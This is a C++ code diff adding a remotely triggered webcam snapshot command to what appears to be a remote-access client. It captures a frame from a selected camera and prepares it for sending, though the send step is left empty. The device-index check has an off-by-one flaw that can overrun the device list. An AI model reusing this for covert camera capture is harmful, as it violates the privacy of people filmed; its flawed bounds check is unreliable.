@@ -370,6 +370,51 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
 
         return;
     }
+
+    if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Single) {
+        if (!this->mod_Cam) {
+            this->mod_Cam = new mod_Camera();
+        }
+        std::vector<IMFActivate*> vcCams;
+        HRESULT hr = this->mod_Cam->ListCaptureDevices(vcCams);
+        if (SUCCEEDED(hr) && vcCams.size() > 0) {
+            u_int iDevice = atoi(strIn[1].c_str());
+            if (iDevice > vcCams.size()) {
+                //index seleccionado es mas grande que el numero de dispositivos, 
+                // 0 - default
+                iDevice = 0;
+            }
+            hr = this->mod_Cam->Init(vcCams[iDevice]);
+            if (SUCCEEDED(hr)) {
+                DebugPrint("[!] Camara iniciada correctamente");
+                std::string strHeader = std::to_string(EnumComandos::CM_Single_Salida);
+                strHeader.append(1, CMD_DEL);
+
+                int iBufferSize = 0;
+                BYTE* cBuffer = this->mod_Cam->GetFrame(iBufferSize);
+
+                int iHeaderSize = strHeader.size();
+                char* cBigBuff = new char[iHeaderSize + iBufferSize];
+
+                memcpy(cBigBuff, strHeader.c_str(), iHeaderSize);
+                memcpy(cBigBuff + iHeaderSize, cBuffer, iBufferSize);
+
+                //Send buffer
+                
+                delete[] cBigBuff;
+                cBigBuff = nullptr;
+
+                delete[] cBuffer;
+                cBuffer = nullptr;
+            }
+        }else {
+            DebugPrint("[X] mod_Cam->ListCaptureDevices error");
+        }
+        //ListCaptureDevices
+        //Init(IMFActivate*& pDevice)
+        //GetFrame
+        return;
+    }
     //#####################################################
 
 
